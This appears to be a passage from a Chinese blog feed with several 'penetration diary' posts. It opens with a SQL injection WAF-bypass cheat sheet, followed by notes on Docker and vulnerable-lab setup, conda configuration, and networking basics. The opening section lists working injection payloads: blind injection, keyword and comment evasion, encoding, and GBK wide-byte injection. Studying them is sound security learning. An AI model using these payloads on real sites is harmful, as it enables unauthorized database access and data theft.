+<h2 id="比较符号（-lt-gt-）绕过（使用greatest-）："><a href="#比较符号（-lt-gt-）绕过（使用greatest-）：" class="headerlink" title="比较符号（&lt;&gt;）绕过（使用greatest()）："></a>比较符号（&lt;&gt;）绕过（<strong>使用greatest()</strong>）：</h2><p>同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。</p>
+<p>最常见的一个盲注的sql语句：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">select</span> <span class="string">*</span> <span class="string">from</span> <span class="string">users</span> <span class="string">where</span> <span class="string">id=1</span> <span class="string">and</span> <span class="string">ascii(substr(database(),0,1))&gt;64</span></span><br></pre></td></tr></table></figure>
+<p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。</p>
+<p>那么上面的这条sql语句可以使用greatest变为如下的子句:</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">select*fromuserswhereid=1and</span> <span class="string">greatest(ascii(substr(database(),0,1)),64)=64</span></span><br></pre></td></tr></table></figure>
+<h2 id="or-and-绕过："><a href="#or-and-绕过：" class="headerlink" title="or and 绕过："></a>or and 绕过：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">and=&amp;&amp;</span> <span class="string">or=||</span></span><br></pre></td></tr></table></figure>
+<h2 id="绕过注释符号（-，—）过滤："><a href="#绕过注释符号（-，—）过滤：" class="headerlink" title="绕过注释符号（#，—）过滤："></a>绕过注释符号（#，—）过滤：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=1&#x27;union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,2,3||&#x27;1</span></span><br></pre></td></tr></table></figure>
+<p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=1&#x27;union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,2,&#x27;3</span></span><br></pre></td></tr></table></figure>
+<h2 id="绕过："><a href="#绕过：" class="headerlink" title="=绕过："></a>=绕过：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">使用like</span> <span class="string">或者</span> <span class="string">使用&lt;</span> <span class="string">或者</span> <span class="string">&gt;</span></span><br></pre></td></tr></table></figure>
+<h2 id="绕过union，select，where等："><a href="#绕过union，select，where等：" class="headerlink" title="绕过union，select，where等："></a>绕过union，select，where等：</h2><h3 id="（1）使用注释符绕过："><a href="#（1）使用注释符绕过：" class="headerlink" title="（1）使用注释符绕过："></a>（1）使用注释符绕过：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">常用注释符：</span></span><br><span class="line"><span class="string">//，--</span> <span class="string">,</span> <span class="string">/**/,</span> <span class="comment">#, --+, -- -, ;,%00,--a</span></span><br><span class="line"><span class="string">用法：</span></span><br><span class="line"><span class="string">U/**/NION/**/SE/**/LECT/**/user，pwd</span> <span class="string">from</span> <span class="string">user</span></span><br></pre></td></tr></table></figure>
+<h3 id="（2）使用大小写绕过："><a href="#（2）使用大小写绕过：" class="headerlink" title="（2）使用大小写绕过："></a>（2）使用大小写绕过：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=-1&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure>
+<h3 id="（3）内联注释绕过："><a href="#（3）内联注释绕过：" class="headerlink" title="（3）内联注释绕过："></a>（3）内联注释绕过：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=-1&#x27;/*!UnIoN*/SeLeCT1,2,concat(/*!table_name*/)</span> <span class="string">FrOM/*information_schema*/.tables/*!WHERE*//*!TaBlE_ScHeMa*/like</span> <span class="string">database()#</span></span><br></pre></td></tr></table></figure>
+<h3 id="（4）-双关键字绕过："><a href="#（4）-双关键字绕过：" class="headerlink" title="（4） 双关键字绕过："></a>（4） 双关键字绕过：</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=-1&#x27;UNIunionONSeLselectECT1,2,3–-</span></span><br></pre></td></tr></table></figure>
+<h2 id="通用绕过（编码）："><a href="#通用绕过（编码）：" class="headerlink" title="通用绕过（编码）："></a>通用绕过（编码）：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">如URLEncode编码，ASCII,HEX,unicode编码绕过：</span></span><br><span class="line"><span class="string">or1=1即%6f%72%20%31%3d%31，而Test也可以为CHAR(101)+CHAR(97)+CHAR(115)+CHAR(116)。</span></span><br></pre></td></tr></table></figure>
+<h2 id="等价函数绕过："><a href="#等价函数绕过：" class="headerlink" title="等价函数绕过："></a>等价函数绕过：</h2><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">hex()、bin()==&gt;ascii()</span></span><br><span class="line"></span><br><span class="line"><span class="string">sleep()==&gt;benchmark()</span></span><br><span class="line"></span><br><span class="line"><span class="string">concat_ws()==&gt;group_concat()</span></span><br><span class="line"></span><br><span class="line"><span class="string">mid()、substr()==&gt;substring()</span> <span class="string">@@user==&gt;user()</span> <span class="string">@@datadir==&gt;datadir()</span></span><br><span class="line"></span><br><span class="line"><span class="string">举例：substring()和substr()无法使用时：?id=1+and+ascii(lower(mid((select+pwd+from+users+limit+1,1),1,1)))=74或者：</span></span><br><span class="line"></span><br><span class="line"><span class="string">substr((select&#x27;password&#x27;),1,1)=0x70strcmp(left(&#x27;password&#x27;,1),0x69)=1strcmp(left(&#x27;password&#x27;,1),0x70)=0strcmp(left(&#x27;password&#x27;,1),0x71)=-1</span></span><br></pre></td></tr></table></figure>
+<h2 id="宽字节注入："><a href="#宽字节注入：" class="headerlink" title="宽字节注入："></a>宽字节注入：</h2><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为/ \’ 。</p>
+<p>在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：</p>
+<p>（1）%df 吃掉 \ 具体的方法是 urlencode(‘) = %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">id=-1%df%27union</span> <span class="string">select</span> <span class="number">1</span><span class="string">,user(),3--+</span></span><br></pre></td></tr></table></figure>
+<p>（2）将 \’ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。</p>
+<p>一般产生宽字节注入的PHP函数：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="number">1.</span><span class="string">replace（）：过滤</span> <span class="string">&#x27; \ ，将 &#x27;</span> <span class="string">转化为</span> <span class="string">\&#x27;</span> <span class="string">，将</span> <span class="string">\</span>  <span class="string">转为</span> <span class="string">\\，将</span> <span class="string">&quot; 转为 \&quot; 。用思路一。</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：&#x27; , &quot;</span> <span class="string">,</span> <span class="string">\</span> <span class="string">。用思路一</span></span><br><span class="line"></span><br><span class="line"><span class="string">（防御此漏洞，要将</span> <span class="string">mysql_query</span> <span class="string">设置为</span> <span class="string">binary</span> <span class="string">的方式）</span></span><br><span class="line"></span><br><span class="line"><span class="number">3.</span><span class="string">mysql_real_escape_string()：转义下列字符：</span></span><br><span class="line"></span><br><span class="line"><span class="string">\x00</span>  <span class="string">\n</span>  <span class="string">\r</span>  <span class="string">\&#x27;&quot;</span>  <span class="string">\x1a</span></span><br><span class="line"></span><br><span class="line"><span class="string">（防御，将mysql设置为gbk即可）</span></span><br></pre></td></tr></table></figure>]]></content>
+      <tags>
+        <tag>日记</tag>
+        <tag>渗透</tag>
+        <tag>SQL注入</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透日记之docker介绍</title>
+    <url>/posts/480dc9b5.html</url>
+    <content><![CDATA[<h2 id="Docker-介绍"><a href="#Docker-介绍" class="headerlink" title="Docker~介绍"></a>Docker~介绍</h2><p>docker组成部分</p>
+<ul>
+<li>Docker Client 客户端</li>
+<li>Docker Daemon 守护进程</li>
+<li>Docker Image 镜像——关键之一</li>
+<li>Docker Container 容器——关键之一</li>
+</ul>
+<blockquote>
+<p>[!NOTE]</p>
+<p>VMware是完全虚拟，硬件虚拟化，虚拟操作系统，驱动，应用程序-——安全，物理隔离。</p>
+<p>共用主机的部分应用程序，服务。</p>
+<p>云安全。有docker逃逸？</p>
+</blockquote>
+<p>安装方式：（推荐Linux系统）</p>
+<ol>
+<li><p>docker.io: apt install docker.io Debian团队维护和打包</p>
+</li>
+<li><p>docker.ce: Docker 官方团队维护和打包</p>
+</li>
+<li><p>docker.ee: 商业版</p>
+<p>Docker环境安装：使用yijing快速安装：</p>
+</li>
+</ol>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">cat</span> etc/apt/soureces.list <span class="comment">#检查下载源</span></span><br><span class="line">git <span class="built_in">clone</span> https://gitee.com/yijingsec/LinuxEnvConfig.git</span><br><span class="line"><span class="built_in">cd</span> LinuxEnvConfig</span><br><span class="line">sudo bash LinuxEnvConfig.sh</span><br><span class="line"><span class="comment">#选择 11.  脚本自动进行Docker安装</span></span><br></pre></td></tr></table></figure>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">apt install docker.io #手动版？ 可以无视这个捏 </span><br><span class="line">apt remove docker docker-engine docker.io #卸载旧版本</span><br></pre></td></tr></table></figure>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507210921854.png" alt="image-20240507210921854" style="zoom: 80%;" /></p>
+<p>相关命令操作：</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 查看docker服务状态</span></span><br><span class="line">systemctl status docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 启动docker服务</span></span><br><span class="line">systemctl start docker</span><br><span class="line"></span><br><span class="line"><span class="comment"># 开启自启动docker服务</span></span><br><span class="line">systemctl <span class="built_in">enable</span> docker</span><br></pre></td></tr></table></figure>
+<p>有必要的话还要安装docker-compose：最新版会自带的；</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker compose</span><br></pre></td></tr></table></figure>
+<h2 id="Docker基础操作部分："><a href="#Docker基础操作部分：" class="headerlink" title="Docker基础操作部分："></a>Docker基础操作部分：</h2><h3 id="1-对镜像的操作："><a href="#1-对镜像的操作：" class="headerlink" title="1.对镜像的操作："></a>1.对镜像的操作：</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker image ls -a</span><br><span class="line">docker images</span><br><span class="line">REPOSITORY：镜像所在的仓库名称</span><br><span class="line">TAG：镜像标签</span><br><span class="line">IMAGEID：镜像ID</span><br><span class="line">CREATED：镜像的创建日期(不是获取该镜像的日期)</span><br><span class="line">SIZE：镜像大小</span><br></pre></td></tr></table></figure>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507223445979.png" alt="image-20240507223445979"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">docker image pull：抓取 image 文件的命令</span><br><span class="line">library/hello-world：image 文件在仓库里面的位置</span><br><span class="line">library：是 image 文件所在的组</span><br><span class="line">hello-world：是 image 文件的名字</span><br><span class="line">#当然因为image都是在library里面的 所以你可以</span><br><span class="line">docker image pull hello-world</span><br><span class="line">#顺便一提，这个命令其实也不是很重要，后面的docker run 或者 docker-compose up -d</span><br><span class="line">#都是会自动拉取镜像下载的w</span><br></pre></td></tr></table></figure>
+<p>顺便一提，速度好慢；拉取镜像建议还是直接拉国内的项目or proxychains</p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507223808633.png" alt="image-20240507223808633"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#先列出镜像</span><br><span class="line">docker images</span><br><span class="line">docker image rm 镜像名或镜像id</span><br><span class="line">docker rmi 镜像名或镜像id</span><br><span class="line">如：</span><br><span class="line"></span><br><span class="line">docker image rm hello-world</span><br><span class="line">docker rmi feb5d9fea6a5</span><br></pre></td></tr></table></figure>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507223941168.png" alt="image-20240507223941168"></p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507224057383.png" alt="image-20240507224057383"></p>
+<p>看一下就知道没拉~</p>
+<h3 id="2-对Docker-容器进行操作"><a href="#2-对Docker-容器进行操作" class="headerlink" title="2.对Docker 容器进行操作"></a>2.对Docker 容器进行操作</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">docker run hello-world <span class="comment">#启动容器</span></span><br><span class="line"><span class="comment">#这里有几个参数要注意：</span></span><br><span class="line">-i 表示以“交互模式”运行容器</span><br><span class="line">-t 表示容器启动后会进入其命令行。加入这两个参数后，容器创建就能登录进去。即 分配一个伪终端。</span><br><span class="line">--name 为创建的容器命名</span><br><span class="line">-v 表示目录映射关系(前者是宿主机目录，后者是映射到宿主机上的目录，即 宿主机目录:容器中目录)，可以使 用多个-v 做多个目录或文件映射。注意:最好做目录映射，在宿主机上做修改，然后 共享到容器上。</span><br><span class="line">-d 在run后面加上-d参数,则会创建一个守护式容器在后台运行(这样创建容器后不 会自动登录容器，如果加-i -t 两个参数，创建后就会自动进去容器)。</span><br><span class="line">-p 表示端口映射，前者是宿主机端口，后者是容器内的映射端口。可以使用多个-p 做多个端口映射</span><br><span class="line">-e 为容器设置环境变量</span><br><span class="line">--network=host 表示将主机的网络环境映射到容器中，容器的网络与主机相同</span><br><span class="line"><span class="comment">#常用的命令的话就是</span></span><br><span class="line">docker run -d --name=Myhello  hello-world <span class="comment">#后台运行</span></span><br><span class="line">docker run -it --name=Myhello hello-world /bin/bash <span class="comment">#进入命令行 执行bash命令</span></span><br></pre></td></tr></table></figure>
+<p>创建成功的样子娅：</p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507225026390.png" alt="image-20240507225026390"></p>
+<p>再来个交互式运行的：（事实证明就算没有library，没有image都是可以直接run的</p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507231332725.png" alt="image-20240507231332725"></p>
+<p>这里面的文件目录都是虚假的，点进去也没有内容的x  想退出的话就exit </p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507231508161.png" alt="image-20240507231508161"></p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507231704804.png" alt="image-20240507231704804"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">#创建完之后当然是....删除掉啦！</span><br><span class="line">docker stop 34d #暂停运行</span><br><span class="line">docker kill 34d #杀掉一个在运行的进程</span><br><span class="line">docker rm -f  34d #强制删除</span><br><span class="line">docker rm $(docker ps -aq) -f  #全部删除</span><br></pre></td></tr></table></figure>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507232112795.png" alt="image-20240507232112795"></p>
+<h3 id="3-容器保存为镜像-（怎么说也不一定用得到"><a href="#3-容器保存为镜像-（怎么说也不一定用得到" class="headerlink" title="3.容器保存为镜像 （怎么说也不一定用得到"></a>3.容器保存为镜像 （怎么说也不一定用得到</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker commit 容器名 镜像名</span></span><br><span class="line"></span><br><span class="line">docker commit mycentos3 mycentos3</span><br></pre></td></tr></table></figure>
+<h3 id="4-镜像备份与迁移"><a href="#4-镜像备份与迁移" class="headerlink" title="4.镜像备份与迁移"></a>4.镜像备份与迁移</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># docker save -o 保存的文件名 镜像名</span></span><br><span class="line">docker save -o ./mycentos3.tar mycentos3</span><br><span class="line">docker load -i ./mycentos3.tar</span><br></pre></td></tr></table></figure>
+<h2 id="docker搭建漏洞靶场"><a href="#docker搭建漏洞靶场" class="headerlink" title="docker搭建漏洞靶场"></a>docker搭建漏洞靶场</h2><h3 id="克隆Vulhub项目"><a href="#克隆Vulhub项目" class="headerlink" title="克隆Vulhub项目"></a>克隆Vulhub项目</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">git <span class="built_in">clone</span> https://gitee.com/yijingsec/vulhub.git</span><br><span class="line"><span class="built_in">cd</span> vulhub-master</span><br><span class="line"><span class="built_in">cd</span> thinkphp/5.0.23-rce</span><br><span class="line"><span class="comment"># 开启靶场</span></span><br><span class="line">docker-compose up -d </span><br><span class="line"><span class="comment"># 关闭靶场</span></span><br><span class="line">docker-compose down </span><br></pre></td></tr></table></figure>
+<h3 id="VulnaApps"><a href="#VulnaApps" class="headerlink" title="VulnaApps"></a>VulnaApps</h3><figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">https://gitee.com/yijingsec/VulApps</span></span><br></pre></td></tr></table></figure>
+<p>打开浏览器访问：<a href="https://gitee.com/yijingsec/VulApps">https://gitee.com/yijingsec/VulApps</a></p>
+<p>打开read.me  按照文档操作就好了</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line"># 以启动thinkphp漏洞环境为例</span><br><span class="line"></span><br><span class="line">docker pull medicean/vulapps:t_thinkphp_2</span><br><span class="line"></span><br><span class="line">docker run -d -p 80:80 medicean/vulapps:t_thinkphp_2</span><br><span class="line"></span><br><span class="line"># -p 80:80 前面的 80 代表物理机的端口，可随意指定；后面的 80 为docker容器中的web服务端口，默认端口80。</span><br></pre></td></tr></table></figure>
+<h3 id="Vulfocus"><a href="#Vulfocus" class="headerlink" title="Vulfocus"></a>Vulfocus</h3><p>安装：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">git clone https://gitee.com/yijingsec/LinuxEnvConfig.git</span><br><span class="line"></span><br><span class="line">cd LinuxEnvConfig</span><br><span class="line"></span><br><span class="line">sudo bash LinuxEnvConfig.sh</span><br><span class="line">docker run -d -p 88:80 --name vulfocus --restart always -v /var/run/docker.sock:/var/run/docker.sock -e VUL_IP=192.168.190.214 registry.cn-hangzhou.aliyuncs.com/mingy123/vulfocus:latest</span><br></pre></td></tr></table></figure>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507233706186.png" alt="image-20240507233706186"></p>
+<p>你的密码~</p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507233725729.png" alt="image-20240507233725729"></p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">admin</span><br><span class="line">admin</span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>日记</tag>
+        <tag>渗透</tag>
+        <tag>docker</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>快速配置你的python环境之conda</title>
+    <url>/posts/dc24cb67.html</url>
+    <content><![CDATA[<p>安装过程：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/Miniconda3-latest-Windows-x86_64.exe</span></span><br><span class="line"><span class="comment">#下载链接~</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>
+<p>选择all users —</p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507211527543.png" alt="image-20240507211527543" style="zoom:67%;" /> </p>
+<p>这里全部勾选。</p>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507211746825.png" alt="image-20240507211746825" style="zoom:67%;" /> </p>
+<p> 然后添加环境变量：win+r -&gt;sysdm.cpl 选择高级环境变量；编辑path变量</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">D:\minaconda3\condabin #嗯，要按照安装路径自己改的说</span><br></pre></td></tr></table></figure>
+<p><img src="https://lanyuan1436.oss-cn-guangzhou.aliyuncs.com/image/Blog/image-20240507212458949.png" alt="image-20240507212458949" style="zoom: 50%;" /> </p>
+<p>给canda换源：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">notepad</span> <span class="string">%USERPROFILE%\.condarc</span></span><br></pre></td></tr></table></figure>
+<p>输入下面的内容</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="attr">channels:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">defaults</span></span><br><span class="line"><span class="attr">show_channel_urls:</span> <span class="literal">true</span></span><br><span class="line"><span class="attr">channel_alias:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda</span></span><br><span class="line"><span class="attr">default_channels:</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/r</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/pro</span></span><br><span class="line">  <span class="bullet">-</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/msys2</span></span><br><span class="line"><span class="attr">custom_channels:</span></span><br><span class="line">  <span class="attr">conda-forge:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br><span class="line">  <span class="attr">msys2:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br><span class="line">  <span class="attr">bioconda:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br><span class="line">  <span class="attr">menpo:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br><span class="line">  <span class="attr">pytorch:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br><span class="line">  <span class="attr">simpleitk:</span> <span class="string">https://mirrors.tuna.tsinghua.edu.cn/anaconda/cloud</span></span><br></pre></td></tr></table></figure>
+<p>像修改env保存地方的话：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">conda</span> <span class="string">config</span> <span class="string">--add</span> <span class="string">envs_dirs</span> <span class="string">D:\miniconda3\envs</span></span><br></pre></td></tr></table></figure>
+<p>最后修改文件权限：？</p>
+<p>使用不同版本的python时：</p>
+<figure class="highlight yaml"><table><tr><td class="code"><pre><span class="line"><span class="string">conda</span> <span class="string">activate</span> <span class="string">base</span> <span class="comment">#进入conda bash命令行</span></span><br><span class="line"><span class="comment">#不过在外面创建说是</span></span><br><span class="line"><span class="string">conda</span> <span class="string">create</span> <span class="string">-n</span> <span class="string">py39</span> <span class="string">python=3.9</span></span><br><span class="line"><span class="string">py27</span></span><br><span class="line"><span class="string">py39</span></span><br><span class="line"><span class="string">bash</span></span><br><span class="line"><span class="string">canda</span> <span class="string">env</span> <span class="string">list</span></span><br><span class="line"><span class="string">conda</span> <span class="string">activate</span> <span class="string">env_name</span></span><br><span class="line"><span class="string">python</span></span><br><span class="line"><span class="string">pip</span> <span class="string">install</span> <span class="string">-r</span> <span class="string">requirement.txt</span></span><br><span class="line"><span class="string">canda</span> <span class="string">deactivate</span> <span class="comment">#退出</span></span><br><span class="line"><span class="comment"># 进入py39虚拟环境</span></span><br><span class="line"><span class="string">conda</span> <span class="string">activate</span> <span class="string">py39</span></span><br><span class="line"><span class="string">conda</span> <span class="string">deactivate</span></span><br><span class="line"><span class="comment"># 进入base虚拟环境</span></span><br><span class="line"><span class="string">conda</span> <span class="string">activate</span> <span class="string">base</span></span><br><span class="line"><span class="string">conda</span> <span class="string">deactivate</span></span><br><span class="line"><span class="comment">#下载命令</span></span><br><span class="line"><span class="string">pip</span> <span class="string">install</span> <span class="string">-r</span> <span class="string">requirements.txt</span> <span class="string">-i</span> <span class="string">https://pypi.tuna.tsinghua.edu.cn/simple/</span></span><br></pre></td></tr></table></figure>
+]]></content>
+      <tags>
+        <tag>python</tag>
+        <tag>环境配置</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>渗透日记之计算机网络</title>
+    <url>/posts/53248527.html</url>
+    <content><![CDATA[<p>常见私有IP段：10.0.0.0 ~10.255.255.255</p>
+<p>00001010.00000000.00000000.00000000~000001010.11111111.11111111.11111111</p>
+<p>​            172.16.0.0~172.31.255.255</p>
+<p>11000000.00010000.00000000.00000000~11000000.00100000.11111111.11111111</p>
+<p>​            192.168.0.0~192.168.255.255</p>
+<p>11000000.10101000.00000000.00000000~11000000.101010000.11111111.11111111</p>
+<script type="math/tex; mode=display">
+2^0=0\;\;\;\;2^1=2\;\;\;\;2^2=4\;\;\;\;2^3=8\;\;\;\;2^4=16\;\;\;\;2^5=32\;\;\;\;2^6=64\;\;\;\;2^7=128</script><h1 id="网络协议分层"><a href="#网络协议分层" class="headerlink" title="网络协议分层"></a>网络协议分层</h1><h2 id="应用层"><a href="#应用层" class="headerlink" title="应用层"></a>应用层</h2><p>提供应用功能；包含c/s p2p模型；</p>
+<p>常见的有http，smtp（TCP协议 25端口），ftp（文件传输协议 21）dns协议</p>
+<h2 id="传输层"><a href="#传输层" class="headerlink" title="传输层"></a>传输层</h2><p>有两个传输协议：</p>
+<ol>
+<li>TCP：大部分应用使用的是TCP传输层协议，有流量控制、超时重传、拥塞控制。保证数据包可靠的传输给对方。</li>
+<li>UDP：相对简单，只负责发生数据包，不保证数据包是否抵达对方，实时性更好，传输效率也高。在应用层实现TCP的特性也可以实现可靠传输。</li>
+</ol>
+<h2 id="网络层"><a href="#网络层" class="headerlink" title="网络层"></a>网络层</h2><p>TCP/IP协议：寻址，路由。</p>
+<p>ip地址：网络号（标识ip地址是哪一个子网的），主机号（标识同一个子网的不同主机）</p>
+<h2 id="数据链路层"><a href="#数据链路层" class="headerlink" title="数据链路层"></a>数据链路层</h2><p>网卡-&gt;MAC；(ARP协议)</p>
+<h2 id="物理层"><a href="#物理层" class="headerlink" title="物理层"></a>物理层</h2><p>二进制信息传输；数据包转为电信号，让其可以在物理介质中传输。这一层就是物理层。</p>
+<h1 id="图解IP"><a href="#图解IP" class="headerlink" title="图解IP"></a>图解IP</h1><p>网关：默认寻找IP。</p>
+<p>路由表：寻找目标；</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">route print</span><br></pre></td></tr></table></figure>
+<p>IP和MAC的关系：MAC实现直连的两个设备之间通信，IP则负责在没有直连的两个网络之间进行通信传输；</p>
+<p>源MAC地址和目标MAC地址一直在变化。源ip和目的ip不会变化。</p>
+<p>2^32=4294967269</p>
+<p>A类地址：0    0.0.0.0 ~127.255.255.255 1677w7214 2^24^-1</p>
+<p>B类地址：10    128.0.0.0 ~191.255.255.255    6w5534 2^16^-1</p>
+<p>C类地址：110    129.0.0.0~223.255.255.255    254 2^8^-1</p>
+<p>d类地址：1110    224.0.0.0~239.255.255.255    组播地址：用于多播:多播用于<strong>将包发送给特定组内的所有主机</strong></p>
+<blockquote>
+<p>[!NOTE]</p>
+<ul>
+<li>224.0.0.0 ~ 224.0.0.255 为预留的组播地址，只能局域网中，路由器是不会进行转发的</li>
+<li>224.0.1.0 ~ 238.255.255.255  为用户可用的组播地址，可以用于 Internet 上</li>
+<li>239.0.0.0 ~ 239.255.255.255 为本地管理组播地址，可供内部网在内部使用，仅在特定的本地范围内有效</li>
+</ul>
+</blockquote>
+<p>e类地址：11110    240.0.0.0~255.255.255    留待用处</p>
+<p>CIDR:无分类地址。前面是网络号，后面是主机号 加上/x</p>
+<p><strong>子网掩码与IP地址按位计算&amp;，可得到网络号</strong></p>
+<p>子网掩码还有一个作用，那就是<strong>划分子网</strong>。</p>
+<p><strong>子网划分实际上是将主机地址分为两个部分：子网网络地址和子网主机地址</strong></p>
+<p>napt协议：ip地址加上端口。</p>
+<blockquote>
+<p>[!TIP]</p>
+<p>私有 IP 地址通常是内部的 IT 人员值管理，公有 IP 地址是由 <code>ICANN</code> 组织管理，中文叫「互联网名称与数字地址分配机构」。</p>
+</blockquote>
+<p>主机号全0为网络地址，全1为广播地址（用于同一链路相互连接的主机之间发送数据包）本地广播会被接受，不同网络的直接广播默认不会设置转发。</p>
+<h2 id="IP协议"><a href="#IP协议" class="headerlink" title="IP协议"></a>IP协议</h2><h3 id="DNS协议：域名解析协议；将网站自动转为ip"><a href="#DNS协议：域名解析协议；将网站自动转为ip" class="headerlink" title="DNS协议：域名解析协议；将网站自动转为ip"></a>DNS协议：域名解析协议；将网站自动转为ip</h3><p>域名存在三个层级：根dns服务器（保存在所有互联网的dns服务器中)；顶级域dns服务器（com，cn）；权威dns服务器</p>
+<p>为了方便记忆而诞生的域名解析协议：过程如下。</p>
+<ol>
+<li>查看DNS缓存 浏览器缓存-&gt;操作系统缓存-&gt;host缓存；     没有转2</li>
+<li>发出DNS请求，询问冰发给本地DNS服务器</li>
+<li>本地DNS服务器查找缓存                       没有转3</li>
+<li>寻找根域名服务器-&gt;给与顶级域名服务器地址</li>
+<li>本地dns询问顶级域名服务器</li>
